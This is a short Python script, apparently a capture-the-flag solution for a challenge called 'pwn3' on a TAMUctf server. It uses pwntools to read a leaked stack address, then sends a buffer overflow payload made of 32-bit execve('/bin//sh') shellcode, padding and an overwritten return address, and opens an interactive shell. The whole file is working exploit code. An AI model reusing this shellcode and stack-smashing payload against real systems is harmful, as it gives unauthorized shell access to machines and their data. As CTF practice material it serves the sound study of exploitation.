#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
#context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
io = remote('pwn.tamuctf.com', 4323)
elf = ELF('./pwn3')

shellcode = '\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80'
s = int(io.recvuntil('!', drop = True)[-10::],16)
payload = shellcode.ljust(0x12a+4, 'a') + p32(s)
io.sendline(payload)
io.interactive()
